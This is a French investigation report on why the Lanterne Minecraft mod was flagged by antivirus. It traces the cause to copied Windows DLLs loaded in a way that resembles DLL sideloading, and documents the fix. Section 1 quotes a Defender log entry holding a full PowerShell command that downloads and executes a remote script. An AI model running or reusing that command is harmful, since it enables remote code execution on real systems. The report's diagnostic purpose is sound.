# Lanterne signalé comme un virus — enquête et correction

> **Version concernée** : 4.0.0
> **Date de l'enquête** : 15 septembre 2026
> **Verdict court** : l'archive du mod est propre. Ce qui alarmait les antivirus, c'étaient les
> **quarante-deux bibliothèques système de Windows** que le mod recopiait dans le dossier du jeu en
> installant son décodeur vidéo. Elles ne servaient à rien. Elles ne sont plus écrites.

---

## 1. Ce qui a été mesuré, et ce qui ne l'a pas été

Il faut commencer par une honnêteté désagréable : **la détection n'a pas pu être reproduite sur la
machine de développement.** Elle est rapportée par des joueurs tiers, et leur relevé exact manque.

Ce qui a été vérifié ici, en revanche, l'a été complètement.

### Windows Defender, sur cette machine, n'a jamais signalé Lanterne

| Source interrogée | Résultat |
|---|---|
| `Get-MpThreatDetection` | **0** entrée |
| `Get-MpThreat` | **0** entrée |
| Journal `Microsoft-Windows-Windows Defender/Operational` | 8 297 évènements depuis le 19 mars 2026 |
| — dont évènements de détection (1116/1117) | **6**, tous le 16 juillet 2026 |
| — dont mentionnant `lanterne`, `.jar`, `minecraft` ou `curseforge` | **0** |

Les six détections du 16 juillet sont **sans aucun rapport** avec le mod. Elles portent toutes le même
nom et la même cible :

```
Trojan:Win32/PShellDlr.SA   (ID 2147848420, gravité « Grave », catégorie « Cheval de Troie »)
Chemin : CmdLine:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile
         -ExecutionPolicy Bypass -Command try { iex ((New-Object Net.WebClient)
         .DownloadString('http://169.254.85.237:18080/arsenal-connect.ps1')) } catch { … }
```

C'est une **ligne de commande** PowerShell, pas un fichier — un « download cradle » (`iex` sur un
`DownloadString`) visant une adresse lien-local en HTTP clair. Cela vient d'un outillage tiers lancé
sur cette machine deux mois avant la 4.0.0 de Lanterne. **À classer, mais ailleurs que dans ce
dossier.**

> ⚠️ Conséquence méthodologique : tout ce qui suit est un raisonnement sur des **causes**, pas la
> lecture d'un relevé. Le nom exact de la détection subie par les joueurs reste à obtenir — voir
> §6, « Ce qu'il faut demander aux joueurs ».

---

## 2. L'archive du mod est propre — inventaire exhaustif

`lanterne-4.0.0.jar`, 2 110 680 octets, tel qu'audité **avant** la correction :

```
SHA-256 : bc0e6c54f3dfdbb2f64d38e97b84a11c54ca906e6602d528ed2b3c6a79fbfca4
```

Inventaire complet des 602 entrées, par extension :

| Extension | Nombre | Quoi |
|---|---|---|
| `.class` | 426 | notre code |
| `.json` | 93 | modèles, recettes, tables de butin |
| `.png` | 24 | textures |
| `.jar` | 3 | dépendances JarJar (détaillées ci-dessous) |
| `.ogg` | 2 | `silence.ogg` ×2 |
| `.fsh` | 2 | nuanciers FSR (`fsr_easu`, `fsr_rcas`) |
| `.toml` | 1 | `neoforge.mods.toml` |
| `.md` | 1 | `NOTICE.md` |
| `.mcmeta` | 1 | animation de texture |
| `.MF` | 1 | `MANIFEST.MF` (25 octets) |
| — | 2 | `META-INF/LICENSE`, dossiers |

**Aucun `.exe`, `.dll`, `.so`, `.dylib`, `.bat`, `.ps1`, `.sh`, `.vbs`, `.scr`.** Aucun binaire
natif, aucun script. Rien d'exécutable en dehors du bytecode Java.

Les trois jars embarqués sont eux aussi du Java pur — vérifié entrée par entrée :

| Jar embarqué | Taille | Contenu | Natifs |
|---|---|---|---|
| `javacpp-1.5.14.jar` | 543 106 o | 225 `.class`, 44 `.properties`, 3 `.xml` | **0** |
| `ffmpeg-8.1.2-1.5.14.jar` | 289 137 o | 218 `.class`, 1 `.xml`, 1 `.properties` | **0** |
| `jlayer-1.0.1.jar` | 143 624 o | 71 `.class`, 4 `.ser`, 1 `.xml` | **0** |

*(Après correction, l'archive reconstruite — 2 125 963 octets,
`d993d361ccc6ca06e8d27d522709aa6e61c7ce31afe35187e7cdc52b25f41c76` — présente le même profil : 605
entrées, toujours zéro exécutable et zéro script. C'est cette empreinte-là qui est publiée dans le
`README.md`.)*

> **Rien d'inattendu n'est entré dans l'archive.** Le contrôle demandé a été fait, et il est négatif.
> Si un antivirus signale `lanterne-4.0.0.jar` lui-même, c'est une heuristique sur un jar non signé,
> pas une trouvaille.

---

## 3. La vraie cause : quarante-deux DLL de Windows recopiées dans le dossier du jeu

C'est ici que tout se joue, et ce n'est pas dans l'archive : c'est dans ce que le mod **écrivait sur
le disque du joueur** en installant son décodeur.

### Ce qu'on trouvait dans `config/lanterne/ffmpeg/windows-x86_64/`

**69 fichiers, 77 Mio.** Leur répartition est accablante :

| Catégorie | Nombre | Signature Authenticode |
|---|---|---|
| `api-ms-win-*.dll` (ensembles d'API de Windows) | **41** | Valide — *Microsoft Corporation* |
| `ucrtbase.dll` (bibliothèque C universelle) | **1** | Valide — *Microsoft Corporation* |
| `msvcp140*`, `vcruntime140*`, `concrt140`, `vcomp140` | **8** | Valide — *Microsoft Windows Software Compatibility Publisher* |
| FFmpeg (`avcodec-62`, `avformat-62`, `avutil-60`, `swscale-9`…) | 7 | **Non signés** |
| JavaCPP (`jniavcodec`, `jnijavacpp`…) | 8 | **Non signés** |
| `libomp140.x86_64.dll`, `libwinpthread-1.dll` | 2 | Non signés |
| `pret.txt`, dossier `cache/` | 2 | — |

Autrement dit : sur les **soixante-sept bibliothèques** extraites, **cinquante et une étaient signées
par Microsoft** — elles appartenaient à Windows, pas à FFmpeg. Le décodeur proprement dit, celui pour
lequel on télécharge 31 Mio, ne pèse que **seize fichiers**, et ce sont les seuls qui ne soient pas
signés.

### Pourquoi c'est exactement la signature d'un logiciel malveillant

Vérification faite sur cette machine :

| Fichier | Déjà dans `System32` ? |
|---|---|
| `ucrtbase.dll` | **oui** |
| `msvcp140.dll` | **oui** |
| `vcruntime140.dll` | **oui** |
| `api-ms-win-core-file-l1-1-0.dll` | **non** — et c'est normal, voir plus bas |

Le mod téléchargeait donc sur Internet des **copies de composants de Windows déjà présents sur la
machine**, les posait dans un dossier où le joueur peut écrire, puis désignait ce dossier au chargeur
de bibliothèques natives via `org.bytedeco.javacpp.platform.preloadpath`, avec `pathsFirst=true` —
c'est-à-dire **en priorité sur le chemin du système**.

Mis bout à bout, le comportement observable par un antivirus est le suivant :

> Un processus (`java.exe`) qui n'est pas un installateur télécharge depuis Internet des fichiers
> portant des noms de composants du système d'exploitation, les écrit dans un répertoire modifiable
> par l'utilisateur, puis charge du code natif depuis ce répertoire **avant** de regarder `System32`.

**C'est la définition du détournement de DLL** (*DLL sideloading* / *DLL hijacking*), la technique par
laquelle un logiciel malveillant fait exécuter son code par un programme honnête. Le fait que nos DLL
soient authentiques et signées par Microsoft ne change rien : ce que l'antivirus juge, c'est **le
geste**, pas le contenu. Un `ucrtbase.dll` parfaitement légitime devient suspect à la seconde où il
apparaît ailleurs que dans `System32`.

Aucune heuristique raisonnable ne peut distinguer notre intention de celle d'un attaquant. **Defender
signalait, et il avait raison de signaler.**

### Et ces fichiers ne servaient à rien

C'est ce qui rend la correction indolore :

- **Les `api-ms-win-*.dll` ne sont jamais lus depuis le disque** sur Windows 10 et au-delà. Ce ne sont
  pas des bibliothèques mais des *ensembles d'API* (« API sets »), résolus par le chargeur du système
  depuis une table tenue par le noyau. La preuve tient en une ligne du tableau ci-dessus :
  `api-ms-win-core-file-l1-1-0.dll` **n'existe pas dans `System32`**, et pourtant tout s'y charge.
  Les poser sur le disque n'avait donc **aucun effet**, sinon celui d'alarmer. Ils ne sont dans le jar
  de bytedeco que pour Windows 7 et 8.1, où l'UCRT se redistribuait effectivement ainsi.
- **`ucrtbase.dll` est un composant du système d'exploitation** depuis Windows 10. Minecraft 26.2 sur
  Java 25 ne tourne nulle part où il manquerait.

---

## 4. Ce qui a été corrigé

Tout tient dans `src/main/java/fr/clubcitrouille/lanterne/client/screen/Fetch.java`. Trois
insertions, aucune réécriture.

### a. Les bibliothèques système ne sont plus extraites

Nouvelle méthode `system(String)`, consultée par `library(String)` avant toute autre chose :

```java
private static boolean system(String lower) {
    return lower.startsWith("api-ms-win-") || lower.equals("ucrtbase.dll");
}
```

**Effet : 67 bibliothèques extraites → 25.** Quarante-deux de moins, dont les quarante et une qui
usurpaient un nom de Windows. Plus un seul nom de composant du système n'est écrit dans le dossier du
joueur. Le dossier passe de 77 Mio à environ 74,5 Mio — le gain n'est pas la place, c'est le silence.

### b. Les installations existantes sont nettoyées

Corriger le filtre n'enlève rien des machines où le décodeur est **déjà** installé : les fichiers y
sont posés, et le marqueur `pret.txt` fait qu'on ne réinstallera jamais par-dessus. D'où `scrub(Path)`,
appelée depuis `arm()` au moment où l'on retrouve une installation existante. Elle **ne retélécharge
rien** — les 31 Mio de FFmpeg restent en place — et retire seulement ce qui n'aurait pas dû être écrit.

### c. `arm()` exige désormais le consentement

`arm()` n'ouvre aucune connexion, ce qui l'avait dispensée de la garde. Mais elle **désigne au chargeur
de natifs un dossier de bibliothèques** et bascule l'état à `PRET`, ce qui autorise `Pump` à charger du
code machine dans le processus du joueur. Un joueur ayant **révoqué** son consentement gardait donc le
chemin natif armé jusqu'au prochain lancement. Ce n'est pas ce que veut dire « non ».

Effet de bord heureux : pour l'immense majorité des joueurs — ceux qui n'ont jamais consenti, le défaut
étant `false` — `arm()` rend désormais la main immédiatement, au lieu d'interroger le disque **vingt
fois par seconde pour toujours**.

### Ce qui n'a pas été touché, et pourquoi

La bibliothèque d'exécution de Visual C++ (`msvcp140`, `vcruntime140`, `concrt140`, `vcomp140`,
8 fichiers) est **gardée volontairement**. Elle n'est pas un composant du système, elle n'est pas
garantie présente sur la machine du joueur, et la déposer à côté du programme qui en a besoin est un
usage **documenté et prévu par Microsoft** (déploiement « app-local »). La retirer risquerait un
`UnsatisfiedLinkError` chez qui n'a pas le redistribuable installé — un vrai bug, pour un gain
heuristique marginal.

---

## 5. Ce qui reste, et qu'on ne peut pas éliminer

Il faut le dire nettement : **la correction réduit fortement le risque, elle ne le supprime pas.**

| Ce qui reste | Pourquoi c'est irréductible |
|---|---|
| **Les natifs FFmpeg ne sont pas signés** | bytedeco ne signe pas ses binaires. `avcodec-62.dll`, `jniavutil.dll` & co. sont `NotSigned`. C'est en amont, pas chez nous. |
| **FFmpeg a un lourd passif de faux positifs** | Précédent direct : [bytedeco/javacpp-presets#221](https://github.com/bytedeco/javacpp-presets/issues/221), où Defender a supprimé `jniavutil.dll` comme `Trojan:Win32/Repjexi`. Plus récemment, `ffmpeg.dll` d'Electron 40.9.2 signalé `Trojan:Win32/Posilod.EB!cl`. |
| **Télécharger puis charger du code natif** | C'est le schéma que les antivirus surveillent, et il n'y a pas de version « innocente » du geste. L'alternative — embarquer les cinq plateformes — ferait une archive de plus de 150 Mio. |
| **Le jar n'est pas signé** | La signature de code coûte de l'argent et **n'est pas la norme** des mods Minecraft. À mentionner, pas à imposer — et le cas de Pulse Launcher montre qu'une application **signée** peut être signalée quand même. |
| **Détections `!ml`** | Le suffixe `!ml` désigne une décision d'apprentissage automatique en nuage, fondée en partie sur la **prévalence** : un fichier neuf, vu sur peu de machines, est suspect *par nouveauté*. Chaque version repart de zéro. |

**Conclusion honnête** : une part de ceci est un faux positif pur que nous ne pouvons pas éliminer.
Mais la part que nous *pouvions* éliminer était réelle, importante, et c'était la nôtre — les
quarante-deux DLL. Le mod ne se comporte plus comme un logiciel malveillant ; il reste seulement
*inhabituel*, ce qui est une catégorie que Microsoft sait traiter sur signalement.

---

## 6. Ce qu'il faut demander aux joueurs

Le relevé manque. Pour le compléter, il faut leur demander de lancer **en PowerShell**, sans droits
particuliers :

```powershell
Get-MpThreat | Select-Object ThreatName, Resources
Get-MpThreatDetection | Select-Object InitialDetectionTime, Resources
```

Trois réponses possibles, et elles n'appellent pas le même remède :

| `Resources` pointe sur… | Diagnostic | Suite |
|---|---|---|
| `…\mods\lanterne-4.0.0.jar` | heuristique sur jar non signé | signaler à Microsoft (§ README) |
| `…\config\lanterne\ffmpeg\…\ucrtbase.dll` ou `api-ms-win-*` | **c'est la cause corrigée ici** | la 4.0.1 règle le cas |
| `…\config\lanterne\ffmpeg\…\jniav*.dll` ou `avcodec-62.dll` | faux positif FFmpeg en amont | signaler le binaire bytedeco à Microsoft |

**Le nom de la détection est la clé** : un `Trojan:Win32/…!ml` ou `Program:Win32/Wacapew.C!ml` est une
décision d'apprentissage automatique (faux positif probable, à signaler) ; un nom sans `!ml` et sans
`HEUR` est une signature, qu'il faudrait prendre beaucoup plus au sérieux.

---

## 7. Sources

- [bytedeco/javacpp-presets#221 — « MS Windows recognizes jniavutil as virus and removes it »](https://github.com/bytedeco/javacpp-presets/issues/221)
- [electron/electron#51394 — `ffmpeg.dll` détecté `Trojan:Win32/Posilod.EB!cl`](https://github.com/electron/electron/issues/51394)
- [SpigotMC — « Windows Defender False Positives » sur les greffons Java](https://www.spigotmc.org/threads/windows-defender-false-positives.639507/)
- [Microsoft Q&A — distinguer un vrai d'un faux `Wacatac.B!ml`](https://learn.microsoft.com/en-us/answers/questions/4359719/how-can-i-know-if-wacatac-b-ml-is-a-false-positive)
- [Microsoft Q&A — faux positif Defender sur application signée, portail WDSI](https://learn.microsoft.com/en-ca/answers/questions/5929545/microsoft-defender-false-positive-and-wdsi-submiss)
- [Portail de signalement Microsoft (WDSI)](https://www.microsoft.com/en-us/wdsi/filesubmission)
